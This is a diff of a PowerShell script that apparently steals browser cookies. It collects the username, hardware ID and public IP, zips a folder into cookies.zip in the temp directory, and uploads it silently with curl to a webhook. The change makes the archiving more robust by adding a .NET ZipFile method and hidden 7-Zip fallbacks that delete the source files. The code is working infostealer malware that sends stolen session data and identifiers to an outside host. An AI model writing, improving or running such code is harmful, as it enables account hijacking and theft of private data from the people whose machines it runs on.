@@ -56,7 +56,16 @@ try { $i = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -Err
 "User: $u`nHWID: $h`nIP: $i" | Out-File "$d\info.txt" -ErrorAction SilentlyContinue
 $zip = "$env:TEMP\cookies.zip"
 if (Test-Path $zip) { Remove-Item $zip -Force -ErrorAction SilentlyContinue }
-Compress-Archive -Path $d -DestinationPath $zip -Force -ErrorAction SilentlyContinue
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+try {
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($d, $zip)
+} catch {
+    if (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
+        & "$env:ProgramFiles\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -sdel -bso0 -bsp0
+    } elseif (Test-Path "${env:ProgramFiles(x86)}\7-Zip\7z.exe") {
+        & "${env:ProgramFiles(x86)}\7-Zip\7z.exe" a -tzip $zip $d -mmt -mx5 -sdel -bso0 -bsp0
+    }
+}
 if (Test-Path $zip) {
     curl.exe -s -F "file=@$zip" $webhook
 }
